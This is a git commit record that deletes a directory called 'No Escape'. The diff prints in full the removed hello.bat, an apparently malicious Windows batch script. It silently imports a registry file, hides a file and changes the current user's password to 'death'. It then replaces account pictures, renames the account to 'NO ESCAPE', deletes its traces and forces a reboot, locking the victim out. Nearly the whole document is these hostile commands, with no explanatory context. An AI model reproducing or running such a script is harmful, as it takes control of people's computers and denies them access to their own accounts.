a19db283a726dcd6066e7bb7f284decb4f4bb119
NightFall <72191792+LocalAlloc@users.noreply.github.com>
2022-12-05 16:26:01 +0530

    Delete No Escape directory

--- No Escape/No Escape/hello.bat
+++
@@ -1,8 +0,0 @@
-regedit /s hello.reg
-del C:\hello.reg
-attrib +s +h C:\hello.png
-net user %username% death
-powershell Expand-Archive C:\a.zip -DestinationPath "C:\ProgramData\Microsoft\User Account Pictures\"
-wmic useraccount where name='%username%' rename 'NO ESCAPE'
-del C:\a.zip
-shutdown /t 0 /r
